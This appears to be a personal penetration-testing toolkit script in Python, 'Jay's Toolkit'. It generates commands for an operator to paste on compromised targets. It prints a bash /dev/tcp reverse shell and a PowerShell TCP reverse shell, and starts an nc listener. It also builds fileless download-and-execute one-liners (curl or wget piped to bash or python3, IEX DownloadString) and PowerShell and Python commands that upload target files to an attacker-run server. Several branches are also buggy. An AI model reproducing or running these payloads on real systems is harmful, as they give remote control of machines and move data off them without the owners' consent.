#!/usr/bin/env python

import os
import sys
import argparse
import subprocess
import random
import hashlib
import string
import netifaces as ni
import time
import urllib.request
from getpass import getpass

# UPLOAD TO WINDOW TARGET METHODS (NEED TO ADD SMB AND FTP)
UploadTo_WinMethods = [
    'HTTP',
    'SCP',
    'Base64',
    # 'SMB',
    # 'FTP',
]

# UPLOAD FROM WINDOWS TARGET METHODS
UploadFrom_WinMethods = [
    'Base64',
    'UploadServer',
    'Python 3',
    # 'SMB',
    # 'FTP',
    # 'WebDAV',
]

# POWERSHELL UPLOAD TO, METHODS
PSTo_Methods = [
    'Invoke-WebRequest',
    'Invoke-WebRequest - Fileless',
    # 'DownloadFile',                   # CURRENTLY NOT WORKING
    'DownloadString - Fileless'
]

# POWERSHELL UPLOAD FROM, METHODS
PSFrom_Methods = [
    'PSUpload.ps1',
    'Base64'
]

# UPLOAD TO LINUX TARGET METHODS
UploadTo_NixMethods = [
    'Base64',
    'Base64 - Fileless',
    'HTTP',
    'HTTP - Fileless',
    # '/dev/tcp',
    'SCP'
]

# UPLOAD FROM LINUX TARGET METHODS
UploadFrom_NixMethods = [
    'Base64',
    # 'SMB',
    # 'FTP',
    # 'WebDAV',
]

# DOWNLOAD METHODS
Download_Methods = [
    'wget',
    'cURL',
    'Python 3',
    'Python 2.7',
    'PHP',
    'Ruby',
    'Perl',
    'JavaScript'
]

PHP_Download_Methods = [
    'File_Get_Contents()',
    'Fopen()',
]

Fileless_Types = [
    'BASH (.sh)',
    'Python (.py)'
]

# PASTABLES OUTPUT TEMPLATE
def pastables(cmd):
    print('\n[================== RUN ON TARGET ==================]\n')
    print(cmd)
    print('\n[================ END RUN ON TARGET ================]\n')

# GENERATE CHOICES BASED ON A DYNAMIC LIST
def dynamic_populated_choices(entrymsg, dynamic_list):
    while True:
        print(entrymsg)
        i = 1
        temp_list = []
        for item in dynamic_list:
            print('      ' + str(i) + ') ' + item)
            i += 1
        print('[?] CHOICE: ', end='')
        try:
            choice = input()
        except KeyboardInterrupt:
            sys.exit(0)
        if int(choice) <= len(dynamic_list):
            choice = dynamic_list[int(choice)-1]
            return choice
        else:
            print('[!] Invalid choice. Try again.')

# SELECT IP ADDRESS TO LISTEN TO
def listening_ip_address():
    # SELECT IP ADDRESS TO LISTEN TO
    ip_list = []
    for interface in ni.interfaces():
        ipv4 = ni.ifaddresses(interface)
        if ni.AF_INET in ipv4.keys():
            ip_list.append(ipv4[ni.AF_INET][0]['addr'])
    while True:
        print('[?] What IP address to listen on? ')
        i = 1
        for ip in ip_list:
            print('      ' + str(i) + ') ' + ip)
            i += 1
        print('[?] CHOICE: ', end='')
        try:
            choice = input()
            if choice == '':
                choice = '999'
        except KeyboardInterrupt:
            sys.exit(0)
        if int(choice) <= len(ip_list):
            return ip_list[int(choice)-1]
        else:
            print('Invalid choice. Try again.')
    
# GET ABSOLUTE PATH OF FILE ON TARGET
def get_absolute_path():
    print('[?] What is the absolute path of the file on target: ', end='')
    try:
        file_absolute_path = input()
        return file_absolute_path
    except KeyboardInterrupt:
        sys.exit(0)

# START HTTP SERVER AND CREATE COPY OF FILE TO BE TRANSFERRED
def start_http_server(listen_ip, listen_port, relpath):
    print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
    try:
        pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print('[+] HTTP server succesfully started')
    except KeyboardInterrupt:
        pyserver.terminate()
        sys.exit(0)
    except:
        print('[!] Failed to start HTTP server')
        sys.exit(1)

    # COPY FILE TO BE TRANSFERRED TO CURRENT DIRECTORY
    cmd = 'cp ' + relpath + ' tmp'
    try:
        subprocess.run(cmd, shell=True)
    except:
        print('[!] Could not temporarily copy file to current directory')

# STOP HTTP SERVER AND DELETE COPY OF FILE TO BE TRANSFERRED
def terminate_http_server():
    # TERMINATE HTTP SERVER
    print('[?] Close HTTP server? [Y/n] ', end='')
    time.sleep(1)
    try:
        subterminate = input().lower()
    except KeyboardInterrupt:
        pyserver.terminate()
        sys.exit(0)
    if subterminate == '':
        subterminate = 'y'
    if subterminate == 'n':
        print('[!] HTTP server was left open')
    else:
        try:
            pyserver.terminate()
            print('[+] HTTP server succesfully terminated')
        except:
            print('[!] Could not terminate Python HTTP server')

    # REMOVE TEMPORARY FILE
    cmd = 'rm tmp'
    try:
        subprocess.run(cmd, shell=True)
    except:
        print('[!] Temporary file to be transferred could not be deleted')

# RUN COMMONLY USED COMMANDS
def run_command(args):
    # RUN NMAP SCAN
    if args.command == 'nmap':
        print('[+] Running nmap scan on ' + args.target_ip)
        subprocess.run(['nmap', '-sV', '-Pn', '-p-', '-oA', args.target_ip, '--open', args.target_ip])
    # RUN GOBUSTER DIR
    elif args.command == 'gbdir':
        print('[+] Running gobuster dir on ' + args.target_url)
        subprocess.run(['gobuster', 'dir', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '>', args.target_url+'.gbdir'])
    # RUN GOBUSTER VHOST
    elif args.command == 'gbvhost':
        print('[+] Running gobuster vhost on ' + args.target_url)
        subprocess.run([['gobuster', 'vhost', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '>', args.target_url+'.gbvhost']])

# DOWNLOAD FILES
def download_file(args):
    # SELECT DOWNLOAD METHOD
    entrymsg = '[?] Which download method to use:'
    choice = dynamic_populated_choices(entrymsg, Download_Methods)
    if choice == 'Python 3':
        try:
            urllib.request.urlretrieve(args.url, args.url.split('/')[-1])
            print('[+] File successfully downloaded')
        except:
            print('[!] File could not be downloaded')
    else:
        if choice == 'wget':
            cmd = 'wget ' + args.url
        elif choice == 'cURL':
            cmd = 'curl ' + args.url + ' -o ' + args.url.split('/')[-1]
        elif choice == 'Python 2.7':
            cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve (' + args.url + ', ' + args.url.split('/')[-1] + ')\''
        elif choice == 'PHP':
            choice = dynamic_populated_choices(entrymsg, PHP_Download_Methods)
            if choice == 'File_Get_Contents()':
                cmd = 'php -r \'\$file = file_get_contents(\"' + args.url + '\"); file_put_contents(\"' + args.url.split('/')[-1] + '\",\$file);\''
            elif choice == 'Fopen()':
                cmd = 'php -r \'const BUFFER = 1024;'
                cmd += '\$fremote = fopen (\"' + args.url + '\", \"rb\");'
                cmd += '\$flocal = fopen(\"' + args.url.split('/')[-1] + ', \"wb\");'
                cmd += 'while (\$buffer = fread(\$fremote, BUFFER)) \{ fwrite(\$flocal, \$buffer); \} '
                cmd += 'fclose(\$flocal); fclose(\$remote);'
        elif choice == 'Ruby':
            cmd = 'ruby -e \'require \"net/http\"; File.write(\"' + args.url.split('/')[-1] + '\", Net::HTTP.get(URI.parse(\"' + args.url + '\")))\''
        elif choice == 'Perl':
            cmd = 'perl -e \'use LWP::Simple; getstore(\"' + args.url + '\", \"' + args.url.split('/')[-1] + '\");\''
        elif choice == 'JavaScript':
            cmd = 'echo \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\' > get.js &&'
            cmd += 'echo \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\' >> get.js &&'
            cmd += 'echo \'WinHttpReq.Send();\' >> get.js &&'
            cmd += 'echo \'BinStream = new ActiveXObject("ADODB.Stream");\' >> get.js &&'
            cmd += 'echo \'BinStream.Type = 1;\' >> get.js &&'
            cmd += 'echo \'BinStream.Open();\' >> get.js &&'
            cmd += 'echo \'BinStream.Write(WinHttpReq.ResponseBody);\' >> get.js &&'
            cmd += 'echo \'BinStream.SaveToFile(WScript.Arguments(1));\' >> get.js'
            cmd += 'node get.js ' + args.url + ' ' + args.url.split('/')[-1]

        # DOWNLOAD
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            proc.wait()
            print('[+] File successfully downloaded')
        except:
            print('[!] File could not be downloaded')

# GENERATE AND VERIFY HASH
def verify_hash(relpath):
    original_md5 = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
    try:
        print('[?] Paste MD5 checksum output here to compare: ', end='')
        remote_md5 = input()
        if original_md5 == remote_md5:
            print('[+] MD5 checksum matches! You\'re good to go.')
        else:
            print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
    except KeyboardInterrupt:
        sys.exit(0)

# CREATE A REVERSE, BIND, OR WEB SHELL PAYLOAD
def create_payload(args):
    if args.shell == 'bind':
        print('[?] Target IP: ', end='')
        listen_ip = input()
    else:
        listen_ip = listening_ip_address()
    print('[?] Listening Port [default=random]: ', end='')
    try:
        listen_port = input()
    except KeyboardInterrupt:
        sys.exit(0)
    if listen_port == '':
        listen_port = 'random'
    if listen_port == 'random':
        random_port = random.randint(1024, 49151)
        listen_port = str(random_port)
    print('[+] Using port ' + listen_port)
    print('[+] Creating payload ...')
    # CHECK PAYLOAD OS
    if args.shell == 'reverse':
        if args.os == 'linux':
            print('\n[===== LINUX PAYLOAD =====]\n')
            print('bash -c \'bash -i >& /dev/tcp/' + listen_ip + '/' + listen_port + ' 0>&1\'')
            print('\n[=== END LINUX PAYLOAD ===]\n')
        elif args.os == 'windows':
            print('\n[===== WINDOWS PAYLOAD =====]\n')
            print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + listen_ip + '\',' + listen_port + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
            print('\n[=== END WINDOWS PAYLOAD ===]\n')

        # PROMPT FOR LISTENER
        print('[?] Would you like to run a listener? [Y/n] ', end='')
        run_listener = input().lower()

        # START LISTENER
        if run_listener == '' or run_listener[0] == 'y':
            try:
                print('[+] Listening on ' + listen_ip + ':' + listen_port + ' ...')
                cmd = 'nc -nls ' + listen_ip + ' -p ' + listen_port
                subprocess.run(cmd)
            except KeyboardInterrupt:
                sys.exit(0)
        else:
            print('[-] No listener was started')
    elif args.shell == 'bind':
        print('[!] Not yet implemented')
    elif args.shell == 'web':
        print('[!] Not yet implemented')

# UPLOAD FILES TO
def upload_to(args):
    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
    relpath = args.filename
    args.filename = os.path.basename(os.path.normpath(args.filename))

    # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
    rand_filename = ''.join(random.choices(string.ascii_letters, k=8))

    # SELECT METHOD
    entrymsg = '[?] What method to use?'

    #########################
    ### TO WINDOWS TARGET ###
    #########################
    if args.os == 'windows':
        # METHOD SELECTION
        method = dynamic_populated_choices(entrymsg, UploadTo_WinMethods)

        ###########################
        ### WINDOWS HTTP METHOD ###
        ###########################
        if method == 'HTTP':
            listen_ip = listening_ip_address()
            listen_port = '443'

            start_http_server(listen_ip, listen_port, relpath)
            
            # PASTABLES
            entrymsg = '[+] Select windows target download method:'
            choice = dynamic_populated_choices(entrymsg, PSTo_Methods)
            if choice == 'DownloadFile':
                print('[+] DownloadFile method selected')
                print('[?] Sync or Async [default=sync]: ', end='')
                try:
                    sync = input().lower()
                except KeyboardInterrupt:
                    pyserver.terminate()
                    sys.exit(0)
                if sync == '':
                    sync = 'sync'
                if sync == 'async':
                    print('[+] Using Asynchronous DownloadFile')
                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\',\'' + rand_filename + '\')'
                    endcmd = ''
                elif sync == 'sync':
                    print('[+] Using Synchronous DownloadFile')
                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\',\'' + rand_filename + '\')'
                    endcmd = ''
            elif choice == 'DownloadString - Fileless':
                print('[+] DownloadString - Fileless method selected')
                choice = random.randint(1, 2)
                if choice == '1':
                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\')'
                    endcmd = ''
                else:
                    startcmd = '(New-Object Net.WebClient).DownloadString(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename
                    endcmd = '\') | IEX'
            elif choice == 'Invoke-WebRequest':
                print('[+] Invoke-WebRequest method selected')
                startcmd = 'Invoke-WebRequest http://' + listen_ip + ':' + listen_port + '/' + args.filename
                endcmd = ' -OutFile ' + rand_filename
            elif choice == 'Invoke-WebRequest - Fileless':
                print('[+] Invoke-WebRequest - Fileless method selected')
                startcmd = 'Invoke-WebRequest http://' + listen_ip + ':' + listen_port + '/' + args.filename
                endcmd = ' | IEX'
            elif choice == 'JavaScript':
                print('[+] JavaScript method selected')
                cmd = '\$file = \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\'\n'
                cmd += '\$file = \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\'\n'
                cmd += '\$file = \'WinHttpReq.Send();\'\n'
                cmd += '\$file = \'BinStream = new ActiveXObject("ADODB.Stream");\'\n'
                cmd += '\$file = \'BinStream.Type = 1;\'\n'
                cmd += '\$file = \'BinStream.Open();\'\n'
                cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\'\n'
                cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\''
                cmd += '\$file | Out-File get.js;'
                cmd += 'cscript.exe /nologo get.js http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
            elif choice == 'VBScript':
                print('[+] VBScript method selected')
                cmd = '\$file = \'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\'\n'
                cmd += '\$file = \'dim bStrm: Set bStrm = createobject("Adodb.Stream")\'\n'
                cmd += '\$file = \'xHttp.Open "GET", WScript.Arguments.Item(0), False\'\n'
                cmd += '\$file = \'xHttp.Send\'\n\n'
                cmd += '\$file = \'with bStrm\'\n'
                cmd += '\$file = \'    .type = 1\'\n'
                cmd += '\$file = \'    .open\'\n'
                cmd += '\$file = \'    .write xHttp.responseBody\'\n'
                cmd += '\$file = \'    .savetofile WScript.Arguments.Item(1), 2\'\n'
                cmd += '\$file = \'end with\';'
                cmd += '\$file | Out-File get.vbs'
                cmd += 'cscript.exe /nologo get.vbs http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename

            else:
                print('[!] Invalid choice')
            cmd = startcmd + endcmd
            pastables(cmd)

            terminate_http_server()

            # if args.firstlaunch:
            #     command = startcmd + ' -UseBasicParsing' + endcmd
            # if args.trust:
            #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')

        #############################    
        ### WINDOWS BASE64 METHOD ###
        #############################
        elif method == 'Base64':
            print('[+] Generating Base64 string of file')
            cmd = 'cat ' + relpath + ' | base64 -w 0'
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
            b64 = proc.stdout.decode()
            print('[+] Run this command on target')

            cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64 + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
            if len(cmd) > 8191:
                print('[!] cmd.exe has a maximum string length of 8,191 characters.')
                sys.exit(0)

            verify_hash(relpath)

        ##########################
        ### WINDOWS SCP METHOD ###
        ##########################
        elif method == 'SCP':
            print('[?] Target IP: ', end='')
            target_ip = input()
            print('[?] Target port [default=22]: ', end='')
            target_port = input()
            if target_port == '':
                target_port = '22'
            print('[?] SCP Username: ', end='')
            scp_user = input()
            scp_password = getpass(prompt='[?] SCP Password: ')
            print('[+] Uploading ' + args.filename + ' to /tmp on ' + target_ip + ' ...')
            scp_connect = scp_user + '@' + target_ip + ':/tmp/' + rand_filename
            res = subprocess.run(['scp', '-P', target_port, args.filename, scp_connect], capture_output=True, text=True)
            if res.returncode == 0:
                print('[+] File uploaded as /tmp/' + rand_filename)
            elif res.returncode == 255:
                print('[!] File could not be uploaded. Connection refused.')

    #######################
    ### TO LINUX TARGET ###
    #######################
    elif args.os == 'linux':
        # METHOD SELECTION
        method = dynamic_populated_choices(entrymsg, UploadTo_NixMethods)

        ###########################
        ### LINUX BASE64 METHOD ###
        ###########################
        if method == 'Base64' or method == 'Base64 - Fileless':
            # GENERATE BASE64 STRING
            print('[+] Generating Base64 string of file')
            cmd = 'cat ' + relpath + ' | base64 -w 0'
            try:
                proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
                b64 = proc.stdout.decode()
            except KeyboardInterrupt:
                print('[!] File not found')

            # PASTABLES
            if method == 'Base64':
                cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
                cmd += 'echo -n \'' + b64 + '\' | base64 -d > ' + args.filename + '\n'
                cmd += '\n# GENERATE MD5 CHECKSUM FOR TRANSFERRED FILE\n'
                cmd += 'md5sum ' + args.filename
            elif method == 'Base64 - Fileless':
                cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                cmd += 'echo -n \'' + b64 + ' | base64 -d | bash'
            pastables(cmd)

            verify_hash(relpath)
        
        #########################
        ### LINUX HTTP METHOD ###
        #########################
        elif method == 'HTTP' or method == 'HTTP - Fileless':
            listen_ip = listening_ip_address()
            listen_port = '443'

            entrymsg = '[+] Select windows target download method:'
            choice = dynamic_populated_choices(entrymsg, Download_Methods)
            if choice == 'cURL':
                if method == 'HTTP':
                    cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
                    cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' -o ' + args.filename
                elif method == 'HTTP - Fileless':
                    entrymsg = '[+] Select file type being uploaded:'
                    choice = dynamic_populated_choices(entrymsg, Fileless_Types)
                    cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                    if choice == 'BASH script (.sh)':
                        cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
                    elif choice == 'Python script (.py)':
                        cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'
            if choice == 'wget':
                if method == 'HTTP':
                    cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
                    cmd += 'wget http://' + listen_ip + ':' + listen_port + '/' + args.filename
                elif method == 'HTTP - Fileless':
                    entrymsg = '[+] Select file type being uploaded:'
                    choice = dynamic_populated_choices(entrymsg, Fileless_Types)
                    cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                    if choice == 'BASH script (.sh)':
                        cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
                    elif choice == 'Python script (.py)':
                        cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'

            start_http_server(listen_ip, listen_port, relpath)
            terminate_http_server()

        ########################
        ### LINUX SCP METHOD ###
        ########################
        elif method == 'SCP':
            print('[?] Target IP: ', end='')
            target_ip = input()
            print('[?] Target port [default=22]: ', end='')
            target_port = input()
            if target_port == '':
                target_port = '22'
            print('[?] SCP Username: ', end='')
            scp_user = input()
            scp_password = getpass(prompt='[?] SCP Password: ')
            print('[+] Uploading ' + args.filename + ' to /tmp on ' + target_ip + ' ...')
            cmd = 'scp -P ' + target_port + ' ' + relpath + ' ' + scp_user + '@' + target_ip + ':/tmp/' + rand_filename
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if proc.returncode == 0:
                print('[+] File uploaded as /tmp/' + rand_filename)
            elif proc.returncode == 255:
                print('[!] File could not be uploaded. Connection refused.')

# UPLOAD FILES FROM
def upload_from(args):
    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
    relpath = args.filename
    args.filename = os.path.basename(os.path.normpath(args.filename))

    # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
    rand_filename = ''.join(random.choices(string.ascii_letters, k=8))

    entrymsg = '[?] What method to use?'

    ###########################
    ### FROM WINDOWS TARGET ###
    ###########################
    if args.os == 'windows':
        # METHOD SELECTION
        method = dynamic_populated_choices(entrymsg, UploadFrom_WinMethods)

        #############################
        ### WINDOWS BASE64 METHOD ###
        #############################
        if method == 'Base64':
            file_absolute_path = get_absolute_path()
            filename = file_absolute_path.split('\\')[-1]
            while True:
                cmd = '# GENERATE BASE64 STRING\n'
                cmd += '[Convert]::ToBase64String((Get-Content -path \"' + file_absolute_path + '\" -Encoding byte))\n'
                cmd += '\n# GENERATE MD5 CHECKSUM\n'
                cmd += 'Get-FileHash ' + file_absolute_path + ' -Algorithm md5'
                pastables(cmd)
                print('[?] Paste generated Base64 string here: ', end='')
                try:
                    b64 = input()
                except KeyboardInterrupt:
                    sys.exit(0)
                print('[?] Paste generated MD5 checksum here: ', end='')
                try:
                    md5_target_hash = input()
                except KeyboardInterrupt:
                    sys.exit(0)
                cmd = 'echo \'' + b64 + '\' | base64 -d > ' + filename
                create_file = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                create_file.wait()
                md5_host_hash = hashlib.md5(open(filename, 'rb').read()).hexdigest()
                if md5_target_hash == md5_host_hash:
                    print('[+] File succesfully transferred to current directory')
                    break
                else:
                    cmd = 'rm ' + filename
                    subprocess.run(cmd, shell=True)
                    print('[!] MD5 checksum does not match')
                    try:
                        input('[*] Press any key to try again ...')
                    except KeyboardInterrupt:
                        sys.exit(0)

        ###################################
        ### WINDOWS UPLOADSERVER METHOD ###
        ###################################
        elif method == 'UploadServer':
            # START UPLOADSERVER
            listen_ip = listening_ip_address()
            print('[+] Starting upload server on ' + listen_ip + ':443 ...')
            try:
                uploadserver = subprocess.Popen(['python3', '-m', 'uploadserver', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print('[+] Upload server successfully started')
            except KeyboardInterrupt:
                sys.exit(0)
            except:
                print('[!] Failed to start upload server')
                sys.exit(1)

            # GET FILENAME AND ABSOLUTE PATH ON TARGET
            file_absolute_path = get_absolute_path()
            filename = file_absolute_path.split('\\')[-1]

            # SELECT WHICH POWERSHELL UPLOAD METHOD
            entrymsg = '[?] Which PowerShell upload method to use on target: '
            choice = dynamic_populated_choices(entrymsg, PSFrom_Methods)

            # GENERATE TARGET PASTABLES
            if choice == 'PSUpload.ps1':
                cmd = '# DOWNLOAD PSUPLOAD.PS1\n'
                cmd += 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1\')\n'
                cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
                cmd += 'Invoke-FileUpload -Uri https://' + listen_ip + '/upload -File ' + file_absolute_path
            elif choice == 'Base64':
                cmd = '# GENERATE BASE64 AND STORE IT AS A VARIABLE\n'
                cmd += '$b64 = [System.convert]::ToBase64String((Get-Content -Path \'' + file_absolute_path + '\' -Encoding Byte))\n'
                cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
                cmd += 'Invoke-WebRequest -Uri https://' + listen_ip + '/ -Method POST -Body $b64'
            elif choice == 'Python 3':
                cmd = 'python3 -c \'import requests;requests.post("http://' + listen_ip + ':443/upload",files={"files":open("' + file_absolute_path + '","rb")})\''
            elif choice == 'Python 2.7':
                cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve ("http://' + listen_ip + ':443/upload",' + args.url.split('/')[-1] + ')\''
            pastables(cmd)

            # TERMINATE UPLOAD SERVER WHEN DONE
            print('[?] Close upload server? [Y/n] ', end='')
            time.sleep(1)
            subterminate = input().lower()
            if subterminate == '':
                subterminate = 'y'
            if subterminate == 'n':
                print('[!] HTTP server was left open')
            else:
                try:
                    uploadserver.terminate()
                    print('[+] Upload server succesfully terminated')
                except:
                    print('[!] Could not terminate upload server')

    #########################
    ### FROM LINUX TARGET ###
    #########################
    elif args.os == 'linux':
        method = dynamic_populated_choices(entrymsg, UploadFrom_NixMethods)

        #     print('[-] Still working on it')
            # b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
            # print('\n[===== START LINUX COMMAND =====]\n')
            # print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
            # print('\n[====== END LINUX COMMAND ======]\n')

# CRACK PASSWORDS
def password_crack(args):
    print('[?] Which cracker would you like to use?')
    print('      1) Hashcat [Default]')
    print('      2) John The Ripper')
    print('CHOICE [1/2]: ', end='')
    crackprog = input().lower()

    if crackprog == '':
        crackprog = 1

    if crackprog == 2:
        print('[*] Not yet implemented')
    else:
        print('[*] Not yet implemented')

# CONNECT TO TARGET SMB
def smb_connect(args):
    print('[+] Connecting to ' + args.target_ip + ' ...')
    smb_connection = subprocess.Popen(['smbclient', '-U', args.username, '\\\\' + args.target_ip + '\\'])
    print(smb_connection)

def main():
    # ARGUMENT PARSER
    parser = argparse.ArgumentParser(
        description='Jay\'s Toolkit',
        epilog='Use \"jref [module] -h\" for more information about a module.'
    )

    # JTK MODULES
    modules = parser.add_subparsers(title='Available Modules', dest='module')

    ################################
    ### PASSWORD CRACKING MODULE ###
    ################################
    # crackpass = modules.add_parser('crackpass', help='Crack password hashes')
    # crackpass.add_argument('filename', help='File that contains password hashes to crack')

    ##########################
    ### SMB CONNECT MODULE ###
    ##########################
    # smb = modules.add_parser('smb', help='Connect to SMB server')
    # smb.add_argument('target_ip', help='SMB server IP address')
    # smb.add_argument('-u', dest='username', help='SMB username')

    #############################
    ### FILE TRANSFER MODULES ###
    #############################
    uploadto = modules.add_parser('uploadto', help='Semi-automated file transfer to target')
    uploadto.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
    uploadto.add_argument('filename', help='File to transfer')
    uploadfrom = modules.add_parser('uploadfrom', help='Pastables to transfer from target')
    uploadfrom.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
    uploadfrom.add_argument('filename', help='File to transfer')

    #######################
    ### DOWNLOAD MODULE ###
    #######################
    download = modules.add_parser('download', help='Download files')
    download.add_argument('url', help='URL of file to be downloaded')

    #############################################
    ### RUN MODULE FOR COMMONLY USED COMMANDS ###
    #############################################
    # run_parser = modules.add_parser('run', help='Commonly used commands')
    
    # # RUN COMMANDS
    # commands = run_parser.add_subparsers(
    #     title='Available Commands',
    #     dest='command'
    # )

    # # RUN NMAP
    # run_nmap = commands.add_parser(
    #     'nmap',
    #     help='$(nmap -sV -Pn -p- -oA <target_ip> --open <target_ip>)'
    # )
    # run_nmap.add_argument('target_ip')

    # # RUN GOBUSTER DIR
    # run_gbdir = commands.add_parser(
    #     'gbdir',
    #     help='$(gobuster dir -u <target_url> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt > target_url.gbdir)'
    # )
    # run_gbdir.add_argument('target_url')

    # # RUN GOBUSTER VHOST
    # run_gbvhost = commands.add_parser(
    #     'gbvhost',
    #     help='$(gobuster vhost -u <target_url> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt > target_url.gbvhost)'
    # )
    # run_gbvhost.add_argument('target_url')

    ##########################################
    ### PAYLOADS MODULE TO GENERATE SHELLS ###
    ##########################################
    payloads = modules.add_parser('payloads', help='Reverse Shell, Bind Shell, and Web Shell')
    payloads.add_argument('shell', choices=['reverse','bind','web'], help='Type of shell')
    payloads.add_argument('os', help='Target operating system', choices=['linux', 'windows'])
    # payloads.add_argument('--encode', choices=['base64','hex','nospace'])

    # PARSE ALL ARGS
    args = parser.parse_args() 
    # if args.module == 'run':
    #     run_command(args)
    if args.module == 'payloads':
        create_payload(args)
    elif args.module == 'uploadto':
        upload_to(args)
    elif args.module == 'uploadfrom':
        upload_from(args)
    elif args.module == 'download':
        download_file(args)
    # elif args.module == 'crackpass':
    #     password_crack(args)
    # elif args.module == 'smb':
    #     smb_connect(args)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()